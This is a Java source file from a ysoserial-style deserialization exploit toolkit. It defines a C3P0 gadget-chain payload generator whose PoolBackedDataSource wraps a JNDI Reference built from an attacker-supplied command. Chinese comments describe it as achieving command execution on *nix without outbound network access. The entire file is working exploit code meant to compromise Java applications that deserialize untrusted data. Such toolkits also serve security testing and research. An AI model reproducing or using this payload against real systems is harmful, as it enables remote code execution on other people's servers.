package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import com.mchange.v2.c3p0.PoolBackedDataSource;
import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import cn.butler.jndi.Dispatcher;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.payloads.annotation.PayloadTest;
import cn.butler.yso.payloads.util.Reflections;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * C3P0不出网Reference注入
 *  无需出网即可利用
 *  目前只完成了*nix 环境下的命令执行，暂未解决执行任意js/任意Java代码
 *  需要从JNDIAttack模块借用Reference对象
 */
@PayloadTest( harness="ysoserial.test.payloads.RemoteClassLoadingTest" )
@Dependencies( { "com.mchange:c3p0:0.9.5.2" ,"com.mchange:mchange-commons-java:0.2.11"} )
@Authors({ Authors.yulegeyu })
public class C3P03 implements ObjectPayload<Object> {

    @Override
    public Object getObject (String command) throws Exception {
        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
        //TomcatBypassController,SnakeYamlController,GroovyShellController,GroovyClassLoaderController,DatabaseController
        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(command));
        return b;
    }

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
        private String command;

        public PoolSource (String command) {
            this.command = command;
        }

        public Reference getReference() throws NamingException {
            Reference ref = (Reference) Dispatcher.getInstance().service(command);
            return ref;
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}
    }

    public static void main ( String[] args ) throws Exception {
        PayloadRunner.run(C3P03.class, args);
    }
}
